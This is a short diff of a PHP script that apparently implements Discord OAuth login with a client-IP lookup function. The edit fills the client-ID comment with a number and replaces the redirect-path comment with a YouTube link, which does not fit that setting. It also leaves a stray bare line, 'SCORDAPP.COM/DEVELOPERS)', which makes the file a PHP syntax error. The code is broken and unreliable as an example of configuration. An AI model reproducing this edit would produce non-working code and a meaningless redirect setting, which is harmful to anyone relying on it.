@@ -2,10 +2,10 @@
 ob_start();
 error_reporting(0);
 
-$client_id     = ""; //CLIENT ID HERE
+$client_id     = ""; //759565390505836544
 $client_secret = ""; //CLIENT SECRET HERE
-$redirect      = ""; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
-
+$redirect      = ""; //https://www.youtube.com/watch?v=jNiKU4-ybBc
+SCORDAPP.COM/DEVELOPERS)
 function get_ip_address()
 {
     if (!empty($_SERVER['HTTP_CLIENT_IP']) && validate_ip($_SERVER['HTTP_CLIENT_IP'])) {
